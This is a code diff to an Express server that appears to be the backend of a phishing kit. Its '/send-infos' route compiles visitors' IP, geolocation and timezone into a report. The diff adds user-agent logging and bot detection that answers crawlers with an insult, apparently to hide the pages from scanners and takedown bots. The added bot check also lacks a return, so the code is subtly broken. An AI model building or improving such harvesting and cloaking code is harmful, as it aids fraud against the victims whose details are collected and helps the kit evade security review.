@@ -1,6 +1,7 @@
 import express from "express";
 import noBots from "express-nobots";
 import geoip from "geoip-lite";
+import MobileDetect from "mobile-detect";
 
 require("dotenv").config();
 
@@ -15,6 +16,12 @@ app.use(noBots());
 app.use(express.json());
 
 app.post("/send-infos", async (req, res) => {
+  const md = new MobileDetect(req.headers["user-agent"] as string);
+  const isBot = md.is("Bot");
+  if (isBot) {
+    res.send("Fuck off");
+  }
+
   try {
     const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
     const geo = geoip.lookup(ip as string | number);
@@ -92,6 +99,7 @@ app.post("/send-infos", async (req, res) => {
      <p>| IP 👉🏽 <b>${ip}</b></p>
      <p>| LOCATION 👉🏽 <b>${geo?.city}, ${geo?.country}</b></p>
      <p>| TIMEZONE 👉🏽 <b>${geo?.timezone}</b></p>
+     <p>| USER AGENT 👉🏽 <b>${req.headers["user-agent"]}</b></p>
      <br>
      <div>*******************************************************************************************</div>
      <div>********************************************END********************************************</div>
@@ -104,7 +112,13 @@ app.post("/send-infos", async (req, res) => {
 });
 
 app.use(express.static(path.join(__dirname, "../build")));
-app.get("/*", (_, res) => {
+app.get("/*", (req, res) => {
+  const md = new MobileDetect(req.headers["user-agent"] as string);
+  const isBot = md.is("Bot");
+  if (isBot) {
+    res.send("Fuck off");
+  }
+
   res.sendFile(path.join(__dirname, "../build", "index.html"));
 });
 
